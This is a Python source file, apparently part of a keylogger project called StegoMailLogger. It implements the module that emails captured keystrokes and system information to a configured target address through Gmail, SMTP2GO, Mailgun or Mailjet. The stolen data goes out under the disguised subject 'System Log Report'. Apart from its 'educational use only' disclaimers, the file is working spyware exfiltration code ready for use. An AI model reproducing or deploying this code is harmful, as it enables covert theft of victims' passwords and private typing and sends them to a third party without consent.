"""
Email functionality for sending keylog data via SMTP.
Supports multiple email providers: Gmail, SMTP2GO, Mailgun, Mailjet.

Author: Educational Cybersecurity Project
Warning: For educational use only in controlled environments.
"""

import smtplib
import ssl
import json
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import logging
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class StegoMailer:
    """
    Handles email transmission of keylog data through various SMTP providers.
    """
    
    def __init__(self, config_path="config.json"):
        """
        Initialize the mailer with configuration.
        
        Args:
            config_path (str): Path to configuration file
        """
        self.config = self._load_config(config_path)
        self.smtp_server = None
        self.is_connected = False
        
    def _load_config(self, config_path):
        """
        Load email configuration from file or environment variables.
        
        Args:
            config_path (str): Path to config file
            
        Returns:
            dict: Configuration dictionary
        """
        try:
            # Try to load from config file first
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    config = json.load(f)
                logger.info("Configuration loaded from file")
            else:
                config = {"email": {}}
                
            # Override with environment variables if available
            email_config = config.get("email", {})
            email_config.update({
                "smtp_server": os.getenv("SMTP_SERVER", email_config.get("smtp_server", "smtp.gmail.com")),
                "smtp_port": int(os.getenv("SMTP_PORT", email_config.get("smtp_port", 587))),
                "username": os.getenv("EMAIL_USERNAME", email_config.get("username", "")),
                "password": os.getenv("EMAIL_PASSWORD", email_config.get("password", "")),
                "target_email": os.getenv("TARGET_EMAIL", email_config.get("target_email", "")),
                "subject": email_config.get("subject", "System Log Report")
            })
            
            config["email"] = email_config
            return config
            
        except Exception as e:
            logger.error(f"Failed to load configuration: {e}")
            raise
    
    def connect_smtp(self):
        """
        Establish SMTP connection with the configured server.
        
        Returns:
            bool: True if connection successful
        """
        try:
            email_config = self.config["email"]
            
            # Create SMTP connection
            self.smtp_server = smtplib.SMTP(
                email_config["smtp_server"], 
                email_config["smtp_port"]
            )
            
            # Enable TLS encryption
            context = ssl.create_default_context()
            self.smtp_server.starttls(context=context)
            
            # Login to the server
            self.smtp_server.login(
                email_config["username"],
                email_config["password"]
            )
            
            self.is_connected = True
            logger.info(f"SMTP connection established to {email_config['smtp_server']}")
            return True
            
        except smtplib.SMTPAuthenticationError as e:
            logger.error(f"SMTP authentication failed: {e}")
            return False
        except smtplib.SMTPException as e:
            logger.error(f"SMTP connection failed: {e}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error during SMTP connection: {e}")
            return False
    
    def disconnect_smtp(self):
        """
        Close SMTP connection.
        """
        try:
            if self.smtp_server and self.is_connected:
                self.smtp_server.quit()
                self.is_connected = False
                logger.info("SMTP connection closed")
        except Exception as e:
            logger.error(f"Error closing SMTP connection: {e}")
    
    def format_log_message(self, keylog_data, system_info=None):
        """
        Format keylog data into an email message.
        
        Args:
            keylog_data (str): Raw keylog data
            system_info (dict): Optional system information
            
        Returns:
            str: Formatted message body
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
=== SYSTEM LOG REPORT ===
Timestamp: {timestamp}
Source: Educational Steganography Project

=== CAPTURED DATA ===
{keylog_data}

=== SYSTEM INFORMATION ===
"""
        
        if system_info:
            for key, value in system_info.items():
                message += f"{key}: {value}\n"
        else:
            message += "System info not available\n"
        
        message += """
=== DISCLAIMER ===
This data was captured for educational cybersecurity purposes only.
Generated by StegoMailLogger learning project.

End of Report
==================
"""
        return message
    
    def send_log(self, keylog_data, system_info=None, custom_subject=None):
        """
        Send keylog data via email.
        
        Args:
            keylog_data (str): Keylog data to send
            system_info (dict): Optional system information
            custom_subject (str): Optional custom subject line
            
        Returns:
            bool: True if email sent successfully
        """
        try:
            email_config = self.config["email"]
            
            # Validate configuration
            if not all([email_config["username"], email_config["password"], 
                       email_config["target_email"]]):
                logger.error("Incomplete email configuration")
                return False
            
            # Connect if not already connected
            if not self.is_connected:
                if not self.connect_smtp():
                    return False
            
            # Create message
            msg = MIMEMultipart()
            msg['From'] = email_config["username"]
            msg['To'] = email_config["target_email"]
            msg['Subject'] = custom_subject or email_config["subject"]
            
            # Format and attach body
            body = self.format_log_message(keylog_data, system_info)
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            text = msg.as_string()
            self.smtp_server.sendmail(
                email_config["username"],
                email_config["target_email"],
                text
            )
            
            logger.info(f"Email sent successfully to {email_config['target_email']}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send email: {e}")
            return False
    
    def send_test_email(self):
        """
        Send a test email to verify configuration.
        
        Returns:
            bool: True if test email sent successfully
        """
        test_data = "This is a test message from StegoMailLogger"
        test_info = {
            "Test": "Configuration Verification",
            "Status": "Active",
            "Purpose": "Educational Cybersecurity Learning"
        }
        
        return self.send_log(
            test_data, 
            test_info, 
            "StegoMailLogger - Test Message"
        )
    
    def get_supported_providers(self):
        """
        Get list of supported email providers with their SMTP settings.
        
        Returns:
            dict: Provider configurations
        """
        return {
            "gmail": {
                "smtp_server": "smtp.gmail.com",
                "smtp_port": 587,
                "notes": "Requires App Password for 2FA accounts"
            },
            "smtp2go": {
                "smtp_server": "mail.smtp2go.com",
                "smtp_port": 587,
                "notes": "Free tier available, requires account"
            },
            "mailgun": {
                "smtp_server": "smtp.mailgun.org",
                "smtp_port": 587,
                "notes": "Sandbox domain available for testing"
            },
            "mailjet": {
                "smtp_server": "in-v3.mailjet.com",
                "smtp_port": 587,
                "notes": "Free tier with daily sending limits"
            }
        }


def test_mailer():
    """
    Test function to verify mailer functionality.
    """
    print("Testing StegoMailer functionality...")
    
    # Create mailer instance
    mailer = StegoMailer()
    
    # Show supported providers
    providers = mailer.get_supported_providers()
    print("Supported Email Providers:")
    for name, config in providers.items():
        print(f"  {name}: {config['smtp_server']}:{config['smtp_port']}")
        print(f"    Notes: {config['notes']}")
    
    # Test configuration loading
    print(f"\nLoaded Configuration:")
    print(f"SMTP Server: {mailer.config['email']['smtp_server']}")
    print(f"SMTP Port: {mailer.config['email']['smtp_port']}")
    print(f"Username: {mailer.config['email']['username']}")
    print(f"Target: {mailer.config['email']['target_email']}")
    
    # Note: Actual email sending would require valid credentials
    print("\nNote: To test email sending, configure valid SMTP credentials")
    print("in config.json or environment variables.")


if __name__ == "__main__":
    test_mailer()